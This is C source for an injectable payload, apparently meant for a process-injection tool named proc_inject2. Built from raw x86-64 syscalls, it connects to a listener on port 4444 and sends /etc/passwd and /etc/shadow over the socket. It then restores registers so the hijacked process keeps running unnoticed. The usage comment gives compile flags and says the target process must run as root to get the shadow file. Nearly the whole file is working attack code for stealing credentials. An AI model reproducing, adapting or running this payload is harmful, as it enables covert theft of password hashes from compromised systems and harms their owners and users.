/* Payload to send passwd and shadow file over network
 * Usage:
 *  start listener on port 4444 and use as payload to proc_inject2
 *
 * compile: 
 * gcc -fpic -pie -nostdlib sendpass.c -o sendpass
 *
 * for this payload start listener on localhost port 4444
 * /etc/passwd and /etc/shadow will be in /tmp/out.txt
 * the proc that you attach to must be running as root to get shadow file
 */


long _write(long fd, char *buf, unsigned long len)
{
	long ret;
	__asm__ volatile(
			"mov %0, %%rdi\n"
			"mov %1, %%rsi\n"
			"mov %2, %%rdx\n"
			"mov $1, %%rax\n"
			"syscall" : : "g"(fd), "g"(buf), "g"(len));
	asm("mov %%rax, %0" : "=r"(ret));
	return ret;
}
long _open(char *buf, unsigned long flags, unsigned long mode)
{
	long ret;
	__asm__ volatile(
			"mov %0, %%rdi\n"
			"mov %1, %%rsi\n"
			"mov %2, %%rdx\n"
			"mov $2, %%rax\n"
			"syscall" : : "g"(buf), "g"(flags), "g"(mode));
	asm("mov %%rax, %0" : "=r"(ret));
	return ret;
}

/* limited to 64k file size */
long _sendfile(long out, long in, char*  offset, short count)
{
	long ret;
	__asm__ volatile(
			"mov %0, %%rdi\n"
			"mov %1, %%rsi\n"
			"mov %2, %%rdx\n"
			"mov %3, %%r10\n"
			"mov $40, %%rax\n"
			"syscall" : : "g"(out), "g"(in), "g"(offset), "g"(count));
	asm("mov %%rax, %0" : "=r"(ret));
	return ret;
}
long _fstat(unsigned long fd, char *buf)
{
	long ret;
	__asm__ volatile(
			"mov %0, %%rdi\n"
			"mov %1, %%rsi\n"
			"mov $5, %%rax\n"
			"syscall" : : "g"(fd), "g"(buf));
	asm("mov %%rax, %0" : "=r"(ret));
	return ret;
}
long _close(long fd)
{
	long ret;
	__asm__ volatile(
			"mov %0, %%rdi\n"
			"mov $3, %%rax\n"
			"syscall" : : "g"(fd));
	asm("mov %%rax, %0" : "=r"(ret));
	return ret;
}

long _socket(long family, long type, long protocol)
{
	long ret;
	__asm__ volatile(
			"mov %0, %%rdi\n"
			"mov %1, %%rsi\n"
			"mov %2, %%rdx\n"
			"mov $41, %%rax\n"
			"syscall" : : "g"(family), "g"(type), "g"(protocol));
	asm("mov %%rax, %0" : "=r"(ret));
	/* returns socket fd */
	return ret;
}

long _connect(int fd, char * addr, int addrlen)
{
	long ret;
	__asm__ volatile(
			"mov %0, %%rdi\n"
			"mov %1, %%rsi\n"
			"mov %2, %%rdx\n"
			"mov $42, %%rax\n"
			"syscall" : : "g"(fd), "g"(addr), "g"(addrlen));
	asm("mov %%rax, %0" : "=r"(ret));
	/* returns socket fd */
	return ret;
}
void Exit(long status)
{
	__asm__ volatile("mov %0, %%rdi\n"
			"mov $60, %%rax\n"
			"syscall" : : "r"(status));
}
/* for debuging */
int _write_byte(unsigned char byte)
{

	unsigned char off, lnib, hnib, asci[3];
	lnib = byte & 0x0f;
	hnib = byte >> 4;
	off = 0x30;
	if (hnib > 9)
		off += 7;

	asci[0] = hnib+off;
	off = 0x30;
	if (lnib > 9)
		off += 7;
	asci[1] = lnib+off;
	asci[2] = ' ';
	_write(1, (char *)&asci[0], 3);
}

_start()
{
	/* attempting to push and pop regs to return to program */

	asm __volatile__(
	".globl real_start	\n"
	"real_start:	\n"
	"push %rsp	\n"
	"push %rbp	\n"
	"push %rax	\n"
	"push %rbx	\n"
	"push %rcx	\n"
	"push %rdx	\n"
	"push %r8	\n"
	"push %r9	\n"
	"push %r10	\n"
	"push %r11	\n"
	"push %r12	\n"
	"push %r13	\n"
	"push %r14	\n"
	"push %r15	\n"
	"call do_main	");
	

//	_write(1, "I am the payload who has hijacked your process!\n", 48);
	asm __volatile__(
	"pop %r15	\n"
	"pop %r14	\n"
	"pop %r13	\n"
	"pop %r12	\n"
	"pop %r11	\n"
	"pop %r10	\n"
	"pop %r9	\n"
	"pop %r8	\n"
	"pop %rdx	\n"
	"pop %rcx	\n"
	"pop %rbx	\n"
	"pop %rax	\n"
	"pop %rbp	\n"
	"pop %rsp	\n"
	"leave	\n"
	"ret ");
	/* shouldnt reach */
	//Exit(0);
}

void do_main()
{

	/* AF_INET: 2 SOCK_STREAM: 1 */

	int i;
	long fd, exit_code;
	long sfd = _socket(2, 1, 0);

	if (sfd < 0)
	{
		_write(1, "no socket\n", 10);
		Exit(-1);
	}

	/* this works */
	/* AF_INET, port 4444, 127.0.0.1, padding */
	char sockstruct[24] = {0x02, 0x00, 0x11, 0x5c, 0x7f, 0x00, 0x00, 0x01,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

	long ret = _connect(sfd,(char *)&sockstruct, 24);
	
	if (ret < 0)
	{
		_write(1, "not successful con\n", 19);
		Exit(ret);
	}

	ret = _write(sfd, "**passwd**\n", 11);
	if (ret < 0)
	{
		_write(1, "not successful\n", 15);
		Exit(ret);
	}
	fd = _open("/etc/passwd", 0, 0);
	if (fd < 0)
	{
		
		_write(1, "open not suc\n", 13);
		Exit(fd);
	}

	unsigned char statstruct[144];
	ret = _fstat(fd, (char *)&statstruct);
	if (ret < 0)
	{
		_write(1, "fstat not successful\n", 21);
		Exit(ret);
	}

	/* debug
	_write_byte(statstruct[48]);
	_write_byte(statstruct[49]);
	*/

	/* size st.st_size */
	short s;
	s = statstruct[48] << 8;
	s = s | statstruct[49];
	/* send file */
	ret = _sendfile(sfd, fd, 0, s);
	if (ret < 0)
	{
		_write(1, "sendfile failed\n", 16);	
	}

	ret = _close(fd);
	if (ret < 0)
	{
		_write(1, "close not successful\n", 21);
		Exit(ret);
	}
	/* do the same for /etc/shadow */
		
	ret = _write(sfd, "**shadow**\n", 11);
	if (ret < 0)
	{
		_write(1, "not successful\n", 15);
		Exit(ret);
	}
	fd = _open("/etc/shadow", 0, 0);
	if (fd < 0)
	{
		
		_write(1, "open not suc\n", 13);
		Exit(fd);
	}

	ret = _fstat(fd, (char *)&statstruct);
	if (ret < 0)
	{
		_write(1, "fstat not successful\n", 21);
		Exit(ret);
	}

	/* debug
	_write_byte(statstruct[48]);
	_write_byte(statstruct[49]);
	*/

	/* size st.st_size */
	s = statstruct[48] << 8;
	s = s | statstruct[49];

	/* send file */
	ret = _sendfile(sfd, fd, 0, s);
	if (ret < 0)
	{
		_write(1, "sendfile failed\n", 16);	
	}

	ret = _close(fd);
	if (ret < 0)
	{
		_write(1, "close not successful\n", 21);
		Exit(ret);
	}
	ret = _close(sfd);
	if (ret < 0)
	{
		_write(1, "close not successful\n", 21);
		Exit(ret);
	}
	/* comment out exit() for return */
//	Exit(exit_code);
}
